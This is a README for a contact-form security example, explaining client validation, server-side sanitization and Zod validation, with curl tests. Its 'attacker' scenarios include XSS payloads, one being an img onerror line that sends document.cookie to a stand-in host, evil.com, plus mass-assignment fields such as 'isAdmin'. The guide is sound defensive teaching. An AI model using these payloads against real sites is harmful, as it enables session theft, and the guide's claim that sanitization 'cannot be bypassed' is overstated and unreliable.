# Contact Form Security Example

This directory contains an example of properly securing a contact form with **layered security**.

## Files

- `route.ts` - API endpoint with sanitization and validation
- `README.md` - This file explaining the security approach

## The Three Layers of Security

### 1. Client-Side Validation (Optional but Recommended)
```tsx
// Example using React Hook Form (install with: pnpm add react-hook-form zod @hookform/resolvers)
'use client';

import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

const contactSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  subject: z.string().min(1).max(200),
  message: z.string().min(10).max(5000),
});

export function ContactForm() {
  const { register, handleSubmit, formState: { errors } } = useForm({
    resolver: zodResolver(contactSchema)
  });

  const onSubmit = async (data: any) => {
    const response = await fetch('/api/contact', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    // Handle response...
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      {/* Form fields */}
    </form>
  );
}
```

**Purpose**: Improve user experience with instant feedback
**Security Level**: ❌ NONE - Can be bypassed

### 2. Server-Side Sanitization (REQUIRED)
```typescript
import { sanitizeInput } from '@/lib/contracts/validation.middleware';

const sanitized = sanitizeInput(rawData, {
  stripHtml: true,
  maxLength: 5000,
  allowedFields: ['name', 'email', 'subject', 'message']
});
```

**Purpose**: Remove malicious content (XSS prevention)
**Security Level**: ✅ HIGH - Cannot be bypassed

### 3. Server-Side Validation (REQUIRED)
```typescript
import { z } from 'zod';

const validated = ContactSchema.parse(sanitized);
```

**Purpose**: Enforce types, formats, and business rules
**Security Level**: ✅ HIGH - Cannot be bypassed

## Why Not Just One?

### Scenario: Attacker Bypasses Client
```bash
# Attacker ignores your React form and calls API directly
curl -X POST https://yourapi.com/api/contact \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Hacker",
    "email": "test@evil.com",
    "subject": "XSS Attack",
    "message": "<script>steal_cookies()</script>",
    "isAdmin": true
  }'
```

**Without sanitization**: XSS payload gets stored in database
**With sanitization**: Script tags removed, `isAdmin` field filtered out

### Scenario: Sophisticated XSS
```javascript
// This passes Zod validation (it's a valid string)
message: '<img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">'
```

**Zod alone**: ✅ Valid string - Stored in database
**Zod + Sanitization**: ❌ HTML stripped - Safe string stored

## Common Mistakes

### ❌ Mistake 1: Client validation only
```typescript
// VULNERABLE!
export async function POST(request: NextRequest) {
  const data = await request.json();
  await saveToDatabase(data); // Direct save without sanitization
}
```

### ❌ Mistake 2: Validation without sanitization
```typescript
// STILL VULNERABLE TO XSS!
export async function POST(request: NextRequest) {
  const data = await request.json();
  const validated = schema.parse(data); // Zod accepts XSS strings
  await saveToDatabase(validated); // Stores malicious content
}
```

### ✅ Correct: Sanitize THEN validate
```typescript
export async function POST(request: NextRequest) {
  const raw = await request.json();
  const sanitized = sanitizeInput(raw, options); // Remove malicious content
  const validated = schema.parse(sanitized);      // Check types & rules
  await saveToDatabase(validated);                 // Safe!
}
```

## Testing Your Security

### Test 1: XSS Prevention
```bash
curl -X POST http://localhost:3000/api/contact \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test",
    "email": "test@example.com",
    "subject": "Test",
    "message": "<script>alert(\"XSS\")</script>"
  }'
```

Expected: Script tags should be removed from stored/displayed content

### Test 2: Field Whitelisting
```bash
curl -X POST http://localhost:3000/api/contact \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test",
    "email": "test@example.com",
    "subject": "Test",
    "message": "Hello",
    "isAdmin": true,
    "creditBalance": 9999
  }'
```

Expected: Only allowed fields (name, email, subject, message) should be processed

### Test 3: Length Limits
```bash
curl -X POST http://localhost:3000/api/contact \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"Test\",\"email\":\"test@example.com\",\"subject\":\"Test\",\"message\":\"$(python3 -c 'print(\"A\" * 10000)')\"}"
```

Expected: Message should be truncated to maxLength setting

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- See `/docs/SECURITY-VALIDATION.md` for comprehensive security guide

## Summary

1. ✅ Use client-side validation for UX (React Hook Form)
2. ✅ Use server-side sanitization for security (`sanitizeInput`)
3. ✅ Use server-side validation for type safety (Zod)
4. ✅ Use parameterized queries for SQL safety (ORMs)
5. ✅ Never trust client-side data

**Remember**: Security requires multiple layers. One defense is never enough.
